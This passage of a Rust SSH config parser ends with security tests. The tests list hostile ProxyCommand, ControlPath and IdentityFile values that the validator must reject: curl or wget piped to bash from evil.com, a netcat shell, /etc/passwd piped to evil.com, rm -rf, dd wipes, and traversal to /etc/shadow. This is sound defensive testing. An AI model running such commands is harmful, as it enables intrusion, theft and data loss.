            base.port = overlay.port;
        }
        if !overlay.identity_files.is_empty() {
            // For identity files, we append them
            base.identity_files
                .extend(overlay.identity_files.iter().cloned());
        }
        if overlay.proxy_jump.is_some() {
            base.proxy_jump = overlay.proxy_jump.clone();
        }
        if overlay.proxy_command.is_some() {
            base.proxy_command = overlay.proxy_command.clone();
        }
        if overlay.strict_host_key_checking.is_some() {
            base.strict_host_key_checking = overlay.strict_host_key_checking.clone();
        }
        if overlay.user_known_hosts_file.is_some() {
            base.user_known_hosts_file = overlay.user_known_hosts_file.clone();
        }
        if overlay.global_known_hosts_file.is_some() {
            base.global_known_hosts_file = overlay.global_known_hosts_file.clone();
        }
        if overlay.forward_agent.is_some() {
            base.forward_agent = overlay.forward_agent;
        }
        if overlay.forward_x11.is_some() {
            base.forward_x11 = overlay.forward_x11;
        }
        if overlay.server_alive_interval.is_some() {
            base.server_alive_interval = overlay.server_alive_interval;
        }
        if overlay.server_alive_count_max.is_some() {
            base.server_alive_count_max = overlay.server_alive_count_max;
        }
        if overlay.connect_timeout.is_some() {
            base.connect_timeout = overlay.connect_timeout;
        }
        if overlay.connection_attempts.is_some() {
            base.connection_attempts = overlay.connection_attempts;
        }
        if overlay.batch_mode.is_some() {
            base.batch_mode = overlay.batch_mode;
        }
        if overlay.compression.is_some() {
            base.compression = overlay.compression;
        }
        if overlay.tcp_keep_alive.is_some() {
            base.tcp_keep_alive = overlay.tcp_keep_alive;
        }
        if !overlay.preferred_authentications.is_empty() {
            base.preferred_authentications = overlay.preferred_authentications.clone();
        }
        if overlay.pubkey_authentication.is_some() {
            base.pubkey_authentication = overlay.pubkey_authentication;
        }
        if overlay.password_authentication.is_some() {
            base.password_authentication = overlay.password_authentication;
        }
        if overlay.keyboard_interactive_authentication.is_some() {
            base.keyboard_interactive_authentication = overlay.keyboard_interactive_authentication;
        }
        if overlay.gssapi_authentication.is_some() {
            base.gssapi_authentication = overlay.gssapi_authentication;
        }
        if !overlay.host_key_algorithms.is_empty() {
            base.host_key_algorithms = overlay.host_key_algorithms.clone();
        }
        if !overlay.kex_algorithms.is_empty() {
            base.kex_algorithms = overlay.kex_algorithms.clone();
        }
        if !overlay.ciphers.is_empty() {
            base.ciphers = overlay.ciphers.clone();
        }
        if !overlay.macs.is_empty() {
            base.macs = overlay.macs.clone();
        }
        if !overlay.send_env.is_empty() {
            base.send_env.extend(overlay.send_env.iter().cloned());
        }
        if !overlay.set_env.is_empty() {
            base.set_env
                .extend(overlay.set_env.iter().map(|(k, v)| (k.clone(), v.clone())));
        }
        if !overlay.local_forward.is_empty() {
            base.local_forward
                .extend(overlay.local_forward.iter().cloned());
        }
        if !overlay.remote_forward.is_empty() {
            base.remote_forward
                .extend(overlay.remote_forward.iter().cloned());
        }
        if !overlay.dynamic_forward.is_empty() {
            base.dynamic_forward
                .extend(overlay.dynamic_forward.iter().cloned());
        }
        if overlay.request_tty.is_some() {
            base.request_tty = overlay.request_tty.clone();
        }
        if overlay.escape_char.is_some() {
            base.escape_char = overlay.escape_char.clone();
        }
        if overlay.log_level.is_some() {
            base.log_level = overlay.log_level.clone();
        }
        if overlay.syslog_facility.is_some() {
            base.syslog_facility = overlay.syslog_facility.clone();
        }
        if !overlay.protocol.is_empty() {
            base.protocol = overlay.protocol.clone();
        }
        if overlay.address_family.is_some() {
            base.address_family = overlay.address_family.clone();
        }
        if overlay.bind_address.is_some() {
            base.bind_address = overlay.bind_address.clone();
        }
        if overlay.clear_all_forwardings.is_some() {
            base.clear_all_forwardings = overlay.clear_all_forwardings;
        }
        if overlay.control_master.is_some() {
            base.control_master = overlay.control_master.clone();
        }
        if overlay.control_path.is_some() {
            base.control_path = overlay.control_path.clone();
        }
        if overlay.control_persist.is_some() {
            base.control_persist = overlay.control_persist.clone();
        }
    }

    /// Get the effective hostname (resolves HostName directive)
    pub fn get_effective_hostname(&self, hostname: &str) -> String {
        let config = self.find_host_config(hostname);
        config.hostname.unwrap_or_else(|| hostname.to_string())
    }

    /// Get the effective username
    pub fn get_effective_user(&self, hostname: &str, cli_user: Option<&str>) -> Option<String> {
        // CLI user takes precedence over SSH config
        if let Some(user) = cli_user {
            return Some(user.to_string());
        }

        let config = self.find_host_config(hostname);
        config.user
    }

    /// Get the effective port
    pub fn get_effective_port(&self, hostname: &str, cli_port: Option<u16>) -> u16 {
        // CLI port takes precedence over SSH config
        if let Some(port) = cli_port {
            return port;
        }

        let config = self.find_host_config(hostname);
        config.port.unwrap_or(22)
    }

    /// Get identity files for a hostname
    pub fn get_identity_files(&self, hostname: &str) -> Vec<PathBuf> {
        let config = self.find_host_config(hostname);
        config.identity_files
    }

    /// Get the effective StrictHostKeyChecking value
    pub fn get_strict_host_key_checking(&self, hostname: &str) -> Option<String> {
        let config = self.find_host_config(hostname);
        config.strict_host_key_checking
    }

    /// Get ProxyJump configuration
    pub fn get_proxy_jump(&self, hostname: &str) -> Option<String> {
        let config = self.find_host_config(hostname);
        config.proxy_jump
    }

    /// Get all host configurations (for debugging)
    pub fn get_all_configs(&self) -> &[SshHostConfig] {
        &self.hosts
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn test_parse_basic_host_config() {
        let config_content = r#"
Host example.com
    User testuser
    Port 2222
    IdentityFile ~/.ssh/test_key
"#;

        let config = SshConfig::parse(config_content).unwrap();
        assert_eq!(config.hosts.len(), 1);

        let host = &config.hosts[0];
        assert_eq!(host.host_patterns, vec!["example.com"]);
        assert_eq!(host.user, Some("testuser".to_string()));
        assert_eq!(host.port, Some(2222));
        assert_eq!(host.identity_files.len(), 1);
    }

    #[test]
    fn test_parse_multiple_hosts() {
        let config_content = r#"
Host web*.example.com
    User webuser
    Port 22

Host db*.example.com
    User dbuser
    Port 5432
"#;

        let config = SshConfig::parse(config_content).unwrap();
        assert_eq!(config.hosts.len(), 2);

        let web_host = &config.hosts[0];
        assert_eq!(web_host.host_patterns, vec!["web*.example.com"]);
        assert_eq!(web_host.user, Some("webuser".to_string()));
        assert_eq!(web_host.port, Some(22));

        let db_host = &config.hosts[1];
        assert_eq!(db_host.host_patterns, vec!["db*.example.com"]);
        assert_eq!(db_host.user, Some("dbuser".to_string()));
        assert_eq!(db_host.port, Some(5432));
    }

    #[test]
    fn test_wildcard_matching() {
        assert!(SshConfig::wildcard_match(
            "web1.example.com",
            "web*.example.com"
        ));
        assert!(SshConfig::wildcard_match(
            "web123.example.com",
            "web*.example.com"
        ));
        assert!(!SshConfig::wildcard_match(
            "db1.example.com",
            "web*.example.com"
        ));
        assert!(SshConfig::wildcard_match("test", "?est"));
        assert!(!SshConfig::wildcard_match("testing", "?est"));
        assert!(SshConfig::wildcard_match("anything", "*"));
    }

    #[test]
    fn test_find_host_config() {
        let config_content = r#"
Host *.example.com
    User defaultuser
    Port 22

Host web*.example.com
    User webuser
    Port 8080

Host web1.example.com
    Port 9090
"#;

        let config = SshConfig::parse(config_content).unwrap();

        // Test that most specific match wins
        let host_config = config.find_host_config("web1.example.com");
        assert_eq!(host_config.user, Some("webuser".to_string())); // From web*.example.com
        assert_eq!(host_config.port, Some(9090)); // From web1.example.com (most specific)

        // Test that patterns are applied in order
        let host_config = config.find_host_config("web2.example.com");
        assert_eq!(host_config.user, Some("webuser".to_string())); // From web*.example.com
        assert_eq!(host_config.port, Some(8080)); // From web*.example.com

        let host_config = config.find_host_config("db1.example.com");
        assert_eq!(host_config.user, Some("defaultuser".to_string())); // From *.example.com
        assert_eq!(host_config.port, Some(22)); // From *.example.com
    }

    #[test]
    fn test_expand_path() {
        // Test tilde expansion
        let path = SshConfig::expand_path("~/.ssh/config");
        assert!(path.to_string_lossy().contains(".ssh/config"));
        assert!(!path.to_string_lossy().starts_with("~"));

        // Test regular path
        let path = SshConfig::expand_path("/etc/ssh/ssh_config");
        assert_eq!(path, PathBuf::from("/etc/ssh/ssh_config"));
    }

    #[test]
    fn test_parse_yes_no_values() {
        assert!(SshConfig::parse_yes_no("yes", 1).unwrap());
        assert!(SshConfig::parse_yes_no("true", 1).unwrap());
        assert!(SshConfig::parse_yes_no("1", 1).unwrap());
        assert!(!SshConfig::parse_yes_no("no", 1).unwrap());
        assert!(!SshConfig::parse_yes_no("false", 1).unwrap());
        assert!(!SshConfig::parse_yes_no("0", 1).unwrap());
        assert!(SshConfig::parse_yes_no("invalid", 1).is_err());
    }

    #[test]
    fn test_parse_complex_config() {
        let config_content = r#"
# Global options
Host *
    ForwardAgent yes
    StrictHostKeyChecking ask
    UserKnownHostsFile ~/.ssh/known_hosts

Host jump-server
    HostName jump.example.com
    User admin
    Port 22
    ForwardAgent yes

Host web-*
    ProxyJump jump-server
    User www-data
    Port 8080
    IdentityFile ~/.ssh/web_key

Host web-prod web-staging
    StrictHostKeyChecking yes
    BatchMode yes
"#;

        let config = SshConfig::parse(config_content).unwrap();
        assert_eq!(config.hosts.len(), 4);

        // Test the jump server config
        let jump_config = config.find_host_config("jump-server");
        assert_eq!(jump_config.hostname, Some("jump.example.com".to_string()));
        assert_eq!(jump_config.user, Some("admin".to_string()));
        assert_eq!(jump_config.port, Some(22));
        assert_eq!(jump_config.forward_agent, Some(true));

        // Test web server config with wildcard and ProxyJump
        let web_config = config.find_host_config("web-01");
        assert_eq!(web_config.proxy_jump, Some("jump-server".to_string()));
        assert_eq!(web_config.user, Some("www-data".to_string()));
        assert_eq!(web_config.port, Some(8080));
        assert!(!web_config.identity_files.is_empty());

        // Test specific host patterns
        let prod_config = config.find_host_config("web-prod");
        assert_eq!(
            prod_config.strict_host_key_checking,
            Some("yes".to_string())
        );
        assert_eq!(prod_config.batch_mode, Some(true));
    }

    #[test]
    fn test_load_from_file() {
        let temp_dir = TempDir::new().unwrap();
        let config_file = temp_dir.path().join("ssh_config");

        let config_content = r#"
Host testhost
    User testuser
    Port 2222
"#;

        std::fs::write(&config_file, config_content).unwrap();

        let config = SshConfig::load_from_file(&config_file).unwrap();
        assert_eq!(config.hosts.len(), 1);

        let host = &config.hosts[0];
        assert_eq!(host.host_patterns, vec!["testhost"]);
        assert_eq!(host.user, Some("testuser".to_string()));
        assert_eq!(host.port, Some(2222));
    }

    #[test]
    fn test_get_effective_values() {
        let config_content = r#"
Host testhost
    HostName actual.example.com
    User configuser
    Port 2222
"#;

        let config = SshConfig::parse(config_content).unwrap();

        // Test hostname resolution
        assert_eq!(
            config.get_effective_hostname("testhost"),
            "actual.example.com"
        );
        assert_eq!(config.get_effective_hostname("otherhost"), "otherhost");

        // Test user resolution (CLI takes precedence)
        assert_eq!(
            config.get_effective_user("testhost", Some("cliuser")),
            Some("cliuser".to_string())
        );
        assert_eq!(
            config.get_effective_user("testhost", None),
            Some("configuser".to_string())
        );
        assert_eq!(config.get_effective_user("otherhost", None), None);

        // Test port resolution (CLI takes precedence)
        assert_eq!(config.get_effective_port("testhost", Some(9999)), 9999);
        assert_eq!(config.get_effective_port("testhost", None), 2222);
        assert_eq!(config.get_effective_port("otherhost", None), 22);
    }

    #[test]
    fn test_negation_patterns() {
        let config_content = r#"
Host * !secure.example.com
    User regularuser

Host secure.example.com
    User secureuser
"#;

        let config = SshConfig::parse(config_content).unwrap();

        // secure.example.com should not match the first pattern due to negation
        let secure_config = config.find_host_config("secure.example.com");
        assert_eq!(secure_config.user, Some("secureuser".to_string()));

        // Other hosts should match the first pattern
        let other_config = config.find_host_config("other.example.com");
        assert_eq!(other_config.user, Some("regularuser".to_string()));
    }

    // Security tests for command injection prevention
    #[test]
    fn test_proxycommand_security_validation() {
        // Test legitimate ProxyCommand values that should pass
        let legitimate_configs = vec![
            "ProxyCommand ssh -W %h:%p gateway.example.com",
            "ProxyCommand connect -S proxy.example.com:1080 %h %p",
            "ProxyCommand none",
            "ProxyCommand socat - PROXY:proxy.example.com:%h:%p,proxyport=8080",
        ];

        for proxy_cmd in legitimate_configs {
            let config_content = format!(
                r#"
Host testhost
    User testuser
    {}
"#,
                proxy_cmd
            );

            let result = SshConfig::parse(&config_content);
            assert!(
                result.is_ok(),
                "Legitimate ProxyCommand should be accepted: {}",
                proxy_cmd
            );
        }

        // Test malicious ProxyCommand values that should be blocked
        let malicious_configs = vec![
            // Command injection via semicolon
            "ProxyCommand ssh -W %h:%p gateway.example.com; rm -rf /",
            // Command injection via pipe
            "ProxyCommand ssh -W %h:%p gateway.example.com | bash",
            // Command injection via background process
            "ProxyCommand ssh -W %h:%p gateway.example.com & curl evil.com",
            // Command substitution with backticks
            "ProxyCommand ssh -W %h:%p `whoami`",
            // Command substitution with $()
            "ProxyCommand ssh -W %h:%p $(whoami)",
            // Variable expansion attack
            "ProxyCommand ssh -W %h:%p $USER",
            // Output redirection
            "ProxyCommand ssh -W %h:%p gateway.example.com > /dev/null; evil_command",
            // Input redirection
            "ProxyCommand ssh -W %h:%p gateway.example.com < /etc/passwd",
            // Unmatched quote injection
            "ProxyCommand ssh -W %h:%p \"unclosed_quote",
            // Suspicious commands
            "ProxyCommand curl http://evil.com/malware.sh | bash",
            "ProxyCommand wget -O - http://evil.com/script | sh",
            "ProxyCommand nc -l 4444 -e /bin/sh",
            "ProxyCommand rm -rf /important/files",
            "ProxyCommand dd if=/dev/zero of=/dev/sda",
            "ProxyCommand cat /etc/passwd | nc evil.com 1337",
        ];

        // Test the regular configs first
        let all_malicious_configs = malicious_configs;

        for malicious_cmd in all_malicious_configs.iter() {
            let config_content = format!(
                r#"
Host testhost
    User testuser
    {}
"#,
                malicious_cmd
            );

            let result = SshConfig::parse(&config_content);
            assert!(
                result.is_err(),
                "Malicious ProxyCommand should be blocked: {}",
                malicious_cmd
            );

            let error = result.unwrap_err();
            let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
            
            let contains_security_violation = error_chain.iter().any(|msg| 
                msg.contains("Security violation") || 
                msg.contains("dangerous character") || 
                msg.contains("command injection") || 
                msg.contains("suspicious command")
            );
            
            assert!(
                contains_security_violation,
                "Error should mention security violation for: {}. Got error chain: {:?}",
                malicious_cmd,
                error_chain
            );
        }

        // Test newline injection separately with proper escaping
        let config_with_newline = r#"
Host testhost
    User testuser
    ProxyCommand ssh -W %h:%p gateway.example.com; echo "newline injection test"
"#;
        let result = SshConfig::parse(config_with_newline);
        assert!(result.is_err(), "Newline injection should be blocked");
        
        // Test carriage return injection by directly calling validation (CR in config parsing is complex)
        let result = SshConfig::validate_executable_string("ssh -W %h:%p gateway.example.com\recho 'cr injection'", "ProxyCommand", 1);
        assert!(result.is_err(), "Carriage return injection should be blocked");
    }

    #[test]
    fn test_controlpath_security_validation() {
        // Test legitimate ControlPath values that should pass
        let legitimate_configs = vec![
            "ControlPath ~/.ssh/control-%h-%p-%r",
            "ControlPath /tmp/ssh_control_%h_%p_%r",
            "ControlPath ~/.ssh/sockets/%r@%h:%p",
            "ControlPath ~/.ssh/control-%L-%l-%n-%d",
            "ControlPath /var/run/ssh/%r@%h:%p",
            "ControlPath none",  // Special case to disable control path
        ];

        for control_path in legitimate_configs {
            let config_content = format!(
                r#"
Host testhost
    User testuser
    {}
"#,
                control_path
            );

            let result = SshConfig::parse(&config_content);
            assert!(
                result.is_ok(),
                "Legitimate ControlPath should be accepted: {}",
                control_path
            );
        }

        // Test malicious ControlPath values that should be blocked
        // Note: ControlPath only takes the first argument, so multi-arg injections don't apply
        let malicious_configs = vec![
            // Command substitution in path name
            "ControlPath ~/.ssh/control-$(whoami)",
            "ControlPath ~/.ssh/control-`id`",
            // Variable expansion in path
            "ControlPath ~/.ssh/control-$USER",
            // Command flag injection (dangerous flags)
            "ControlPath --evil-flag",
            "ControlPath -rf",
            // Unknown substitution patterns
            "ControlPath ~/.ssh/control-%x",  // %x is not a valid SSH token
            "ControlPath ~/.ssh/control-%z",  // %z is not a valid SSH token
            // Unmatched quotes
            "ControlPath ~/.ssh/control-\"unclosed",
            // Dangerous characters in path that could be interpreted
            "ControlPath ~/.ssh/control-;",
            "ControlPath ~/.ssh/control-|",
            "ControlPath ~/.ssh/control-&",
            "ControlPath ~/.ssh/control->",
            "ControlPath ~/.ssh/control-<",
        ];

        for malicious_path in malicious_configs.iter() {
            let config_content = format!(
                r#"
Host testhost
    User testuser
    {}
"#,
                malicious_path
            );

            let result = SshConfig::parse(&config_content);
            assert!(
                result.is_err(),
                "Malicious ControlPath should be blocked: {}",
                malicious_path
            );

            let error = result.unwrap_err();
            let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
            
            let contains_security_violation = error_chain.iter().any(|msg| 
                msg.contains("Security violation") || 
                msg.contains("dangerous character") || 
                msg.contains("command injection") || 
                msg.contains("suspicious command")
            );
            
            assert!(
                contains_security_violation,
                "Error should mention security violation for: {}. Got error chain: {:?}",
                malicious_path,
                error_chain
            );
        }
    }

    #[test]
    fn test_validate_executable_string_quote_handling() {
        // Test quote validation specifically
        let valid_quotes = vec![
            "ssh -W %h:%p \"quoted argument\"",
            "ssh -W %h:%p 'single quotes'",
            "ssh -W %h:%p \"escaped \\\" quote\"",
            "ssh -W %h:%p no_quotes_at_all",
            "path/with/no/quotes",
        ];

        for value in valid_quotes {
            assert!(
                SshConfig::validate_executable_string(value, "ProxyCommand", 1).is_ok(),
                "Valid quote usage should be accepted: {}",
                value
            );
        }

        let invalid_quotes = vec![
            "ssh -W %h:%p \"unclosed quote",
            "ssh -W %h:%p unclosed quote\"",
            "ssh -W %h:%p \"quote1\" \"unclosed quote2",
        ];

        for value in invalid_quotes {
            assert!(
                SshConfig::validate_executable_string(value, "ProxyCommand", 1).is_err(),
                "Invalid quote usage should be rejected: {}",
                value
            );
        }
    }

    #[test] 
    fn test_validate_executable_string_edge_cases() {
        // Test empty strings
        assert!(SshConfig::validate_executable_string("", "ProxyCommand", 1).is_ok());

        // Test very long strings (potential DoS)
        let long_string = "a".repeat(10000);
        assert!(SshConfig::validate_executable_string(&long_string, "ProxyCommand", 1).is_ok());

        // Test unicode characters
        assert!(SshConfig::validate_executable_string("ssh -W %h:%p 🚀", "ProxyCommand", 1).is_ok());

        // Test null bytes (should be blocked)
        let null_string = "ssh -W %h:%p\0evil";
        assert!(SshConfig::validate_executable_string(&null_string, "ProxyCommand", 1).is_err());

        // Test carriage return (should be blocked)
        let cr_string = "ssh -W %h:%p\revil";
        assert!(SshConfig::validate_executable_string(&cr_string, "ProxyCommand", 1).is_err());
    }

    #[test]
    fn test_security_validation_error_messages() {
        // Test that error messages are informative
        let result = SshConfig::validate_executable_string("evil; rm -rf /", "ProxyCommand", 42);
        assert!(result.is_err());
        let error_msg = result.unwrap_err().to_string();
        assert!(error_msg.contains("Security violation"));
        assert!(error_msg.contains("ProxyCommand"));
        assert!(error_msg.contains("line 42"));
        assert!(error_msg.contains("command injection"));

        // Test ControlPath specific error
        let result = SshConfig::validate_executable_string("--evil-flag", "ControlPath", 24);
        assert!(result.is_err());
        let error_msg = result.unwrap_err().to_string();
        assert!(error_msg.contains("Security violation"));
        assert!(error_msg.contains("ControlPath"));
        assert!(error_msg.contains("line 24"));
    }

    #[test]
    fn test_real_world_ssh_config_with_security_validation() {
        // Test a comprehensive SSH config with legitimate use cases
        let config_content = r#"
# Safe configuration that should pass validation
Host jump-host
    HostName jump.example.com
    User admin
    ProxyCommand none

Host web-*
    ProxyCommand ssh -W %h:%p jump-host
    ControlPath ~/.ssh/control-%r@%h:%p
    ControlMaster auto
    ControlPersist 600

Host database
    ProxyCommand connect -S proxy.corp.com:1080 %h %p
    ControlPath /tmp/ssh_control_%h_%p_%r
"#;

        let config = SshConfig::parse(config_content).unwrap();
        assert_eq!(config.hosts.len(), 3);

        // Verify the configurations are parsed correctly
        let jump_config = config.find_host_config("jump-host");
        assert_eq!(jump_config.proxy_command, Some("none".to_string()));

        let web_config = config.find_host_config("web-01");
        assert_eq!(web_config.proxy_command, Some("ssh -W %h:%p jump-host".to_string()));
        assert_eq!(web_config.control_path, Some("~/.ssh/control-%r@%h:%p".to_string()));

        let db_config = config.find_host_config("database");
        assert_eq!(db_config.proxy_command, Some("connect -S proxy.corp.com:1080 %h %p".to_string()));
        assert_eq!(db_config.control_path, Some("/tmp/ssh_control_%h_%p_%r".to_string()));
    }

    // Path traversal security tests
    #[test]
    fn test_path_traversal_prevention_identity_files() {
        // Test malicious IdentityFile paths that should be blocked
        let malicious_configs = vec![
            "IdentityFile ../../../etc/passwd",
            "IdentityFile ~/.ssh/../../../etc/shadow",
            "IdentityFile ~/../../etc/group",
            "IdentityFile /etc/passwd",
            "IdentityFile /proc/self/environ",
            "IdentityFile /sys/class/dmi/id/product_serial",
            "IdentityFile /dev/random",
            "IdentityFile \\Windows\\System32\\config\\SAM",
        ];

        for malicious_path in malicious_configs {
            let config_content = format!(
                r#"
Host testhost
    User testuser
    {}
"#,
                malicious_path
            );

            let result = SshConfig::parse(&config_content);
            assert!(
                result.is_err(),
                "Malicious IdentityFile path should be blocked: {}",
                malicious_path
            );

            let error = result.unwrap_err();
            let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
            
            let contains_security_violation = error_chain.iter().any(|msg| 
                msg.contains("Security violation") || 
                msg.contains("path traversal") || 
                msg.contains("sensitive system") ||
                msg.contains("directory traversal")
            );
            
            assert!(
                contains_security_violation,
                "Error should mention security violation for: {}. Got error chain: {:?}",
                malicious_path,
                error_chain
            );
        }
    }

    #[test]
    fn test_path_traversal_prevention_known_hosts_files() {
        // Test malicious UserKnownHostsFile and GlobalKnownHostsFile paths
        let malicious_configs = vec![
            ("UserKnownHostsFile", "../../../etc/passwd"),
            ("UserKnownHostsFile", "~/../../../etc/shadow"),
            ("GlobalKnownHostsFile", "/etc/passwd"),
            ("GlobalKnownHostsFile", "/proc/version"),
            ("UserKnownHostsFile", "/sys/kernel/debug/tracing/trace"),
            ("GlobalKnownHostsFile", "\\Windows\\System32\\drivers\\etc\\hosts"),
        ];

        for (directive, malicious_path) in malicious_configs {
            let config_content = format!(
                r#"
Host testhost
    User testuser
    {} {}
"#,
                directive, malicious_path
            );

            let result = SshConfig::parse(&config_content);
            assert!(
                result.is_err(),
                "Malicious {} path should be blocked: {}",
                directive, malicious_path
            );

            let error = result.unwrap_err();
            let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
            
            let contains_security_violation = error_chain.iter().any(|msg| 
                msg.contains("Security violation") || 
                msg.contains("path traversal") || 
                msg.contains("sensitive system") ||
                msg.contains("directory traversal")
            );
            
            assert!(
                contains_security_violation,
                "Error should mention security violation for: {} {}. Got error chain: {:?}",
                directive, malicious_path, error_chain
            );
        }
    }

    #[test]
    fn test_legitimate_paths_allowed() {
        // Test that legitimate file paths are still allowed
        let legitimate_configs = vec![
            "IdentityFile ~/.ssh/id_rsa",
            "IdentityFile ~/.ssh/id_ed25519",
            "IdentityFile /home/user/.ssh/mykey",
            "UserKnownHostsFile ~/.ssh/known_hosts",
            "GlobalKnownHostsFile /etc/ssh/ssh_known_hosts",
            "IdentityFile /Users/user/.ssh/corporate_key",
        ];

        for legitimate_path in legitimate_configs {
            let config_content = format!(
                r#"
Host testhost
    User testuser
    {}
"#,
                legitimate_path
            );

            let result = SshConfig::parse(&config_content);
            assert!(
                result.is_ok(),
                "Legitimate path should be allowed: {}. Error: {:?}",
                legitimate_path,
                result.err()
            );
        }
    }

    #[test]
    fn test_symlink_attack_prevention() {
        use tempfile::TempDir;

        let temp_dir = TempDir::new().unwrap();
        let temp_path = temp_dir.path();
        
        // Create a symlink that points outside the directory
        let symlink_path = temp_path.join("malicious_symlink");
        let target_path = "/etc/passwd";
        
        // Only test on systems where we can create symlinks
        if let Ok(()) = std::os::unix::fs::symlink(target_path, &symlink_path) {
            let symlink_str = symlink_path.to_string_lossy();
            let config_content = format!(
                r#"
Host testhost
    User testuser
    IdentityFile {}
"#,
                symlink_str
            );

            // The symlink should be resolved during canonicalization and blocked
            // if it points to a sensitive location
            let result = SshConfig::parse(&config_content);
            
            // On systems where /etc/passwd exists, this should be blocked
            if std::path::Path::new("/etc/passwd").exists() {
                assert!(
                    result.is_err(),
                    "Symlink pointing to sensitive file should be blocked"
                );
                
                let error = result.unwrap_err();
                let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
                
                let contains_security_violation = error_chain.iter().any(|msg| 
                    msg.contains("Security violation") || 
                    msg.contains("path traversal") || 
                    msg.contains("sensitive system") ||
                    msg.contains("directory traversal")
                );
                
                assert!(
                    contains_security_violation,
                    "Error should indicate security violation: {:?}",
                    error_chain
                );
            }
        }
    }

    #[test]
    fn test_null_byte_injection_prevention() {
        // Test that null bytes in paths are blocked
        // Note: We need to test this differently since config parsing may not preserve null bytes
        
        // Test direct validation with null bytes
        let malicious_paths_with_nulls = vec![
            "~/.ssh/key\0extra",
            "~/.ssh/known_hosts\0commands",
            "/home/user/.ssh/id_rsa\0injection",
        ];

        for malicious_path in malicious_paths_with_nulls {
            let result = SshConfig::secure_validate_path(malicious_path, "identity", 1);
            assert!(
                result.is_err(),
                "Path with null byte should be blocked: {}",
                malicious_path.replace('\0', "\\0")
            );

            let error = result.unwrap_err();
            let error_msg = error.to_string();
            assert!(
                error_msg.contains("Security violation") && error_msg.contains("null byte"),
                "Error should mention null byte security violation: {}",
                error_msg
            );
        }

        // Test config parsing with suspicious patterns that might contain hidden characters
        let suspicious_configs = vec![
            // These should be blocked for other reasons (path traversal)
            "IdentityFile ~/.ssh/key/../../../etc/passwd",
            "UserKnownHostsFile ~/.ssh/../../../etc/shadow",
            "GlobalKnownHostsFile /etc/passwd",
        ];

        for suspicious_path in suspicious_configs {
            let config_content = format!(
                r#"
Host testhost
    User testuser
    {}
"#,
                suspicious_path
            );

            let result = SshConfig::parse(&config_content);
            assert!(
                result.is_err(),
                "Suspicious path should be blocked: {}",
                suspicious_path
            );

            let error = result.unwrap_err();
            let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
            
            let contains_security_violation = error_chain.iter().any(|msg| 
                msg.contains("Security violation") || 
                msg.contains("path traversal") || 
                msg.contains("sensitive system") ||
                msg.contains("directory traversal")
            );
            
            assert!(
                contains_security_violation,
                "Error should mention security violation: {:?}",
                error_chain
            );
        }
    }

    #[test]
    fn test_environment_variable_expansion_security() {
        // Set a test environment variable
        std::env::set_var("TEST_MALICIOUS_VAR", "../../../etc/passwd");
        
        let config_content = r#"
Host testhost
    User testuser
    IdentityFile ${TEST_MALICIOUS_VAR}
"#;

        let result = SshConfig::parse(config_content);
        assert!(
            result.is_err(),
            "Environment variable expansion leading to path traversal should be blocked"
        );

        let error = result.unwrap_err();
        let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
        
        let contains_security_violation = error_chain.iter().any(|msg| 
            msg.contains("Security violation") || 
            msg.contains("path traversal") || 
            msg.contains("sensitive system") ||
            msg.contains("directory traversal")
        );
        
        assert!(
            contains_security_violation,
            "Error should indicate security violation: {:?}",
            error_chain
        );

        // Clean up
        std::env::remove_var("TEST_MALICIOUS_VAR");
    }

    #[test]
    fn test_secure_validate_path_directly() {
        // Test the secure_validate_path function directly
        
        // Test legitimate paths
        let legitimate_paths = vec![
            ("~/.ssh/id_rsa", "identity"),
            ("/home/user/.ssh/known_hosts", "known_hosts"),
            ("relative/path/key", "identity"),
        ];

        for (path, path_type) in legitimate_paths {
            let result = SshConfig::secure_validate_path(path, path_type, 1);
            // Note: Some of these might fail if the paths don't exist, but they shouldn't fail with security violations
            if let Err(e) = result {
                let error_msg = e.to_string();
                assert!(
                    !error_msg.contains("Security violation"),
                    "Legitimate path should not trigger security violation: {} - {}",
                    path, error_msg
                );
            }
        }

        // Test malicious paths
        let malicious_paths = vec![
            ("../../../etc/passwd", "identity"),
            ("/etc/shadow", "identity"),
            ("path\0with\0nulls", "known_hosts"),
            ("/proc/self/environ", "identity"),
        ];

        for (path, path_type) in malicious_paths {
            let result = SshConfig::secure_validate_path(path, path_type, 1);
            assert!(
                result.is_err(),
                "Malicious path should be rejected: {}",
                path
            );

            let error = result.unwrap_err();
            let error_msg = error.to_string();
            assert!(
                error_msg.contains("Security violation"),
                "Error should indicate security violation for {}: {}",
                path, error_msg
            );
        }
    }
}
